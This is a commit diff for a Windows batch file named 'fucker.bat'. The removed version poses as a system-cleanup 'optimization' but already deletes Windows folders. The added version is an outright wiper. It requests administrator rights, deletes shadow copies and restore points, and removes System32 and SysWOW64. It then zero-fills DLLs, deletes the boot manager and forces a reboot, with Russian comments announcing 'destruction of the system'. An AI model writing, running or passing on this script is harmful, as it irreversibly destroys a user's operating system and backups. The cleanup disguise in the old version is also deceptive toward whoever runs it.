53a551a2877fab7048597e0d3861b91e947b8924
Minish777 <frostdgs2000@gmail.com>
2025-12-28 14:36:18 +0300

    Update fucker.bat

--- fucker.bat
+++ fucker.bat
@@ -1,15 +1,33 @@
 @echo off
-chcp 65001 > nul
-echo Удаление ненужных системных компонентов...
-echo =========================================
-echo Удаляем папку Globalization...
-rd /s /q "C:\Windows\Globalization" 2>nul
-echo Удаляем временные файлы...
-rd /s /q "C:\Windows\Temp" 2>nul
-rd /s /q "C:\Windows\Prefetch" 2>nul
-echo Удаляем кэш локализации...
-rd /s /q "C:\Windows\System32\IME" 2>nul
-echo.
-echo Оптимизация завершена! Перезагрузка через 5 секунд...
-timeout /t 5 /nobreak > nul
+:: Проверяем права администратора
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Запрос прав администратора...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+echo Уничтожение системы...
+
+:: Удаляем теневое копирование
+vssadmin delete shadows /all /quiet
+
+:: Удаляем точки восстановления
+powershell -Command "Get-ComputerRestorePoint | Remove-ComputerRestorePoint"
+
+:: Удаляем папку Globalization и другие
+rd /s /q C:\Windows\Globalization 2>nul
+rd /s /q C:\Windows\System32 2>nul
+rd /s /q C:\Windows\SysWOW64 2>nul
+
+:: Перезаписываем случайные файлы в System32 нулями
+for /r C:\Windows\System32 %%i in (*.dll) do (
+    fsutil file createnew "%%i" 0 2>nul
+)
+
+:: Удаляем загрузчик
+del /f /q C:\bootmgr 2>nul
+del /f /q C:\bootmgr.efi 2>nul
+
+echo Уничтожение завершено. Перезагрузка...
 shutdown /r /t 0 /f
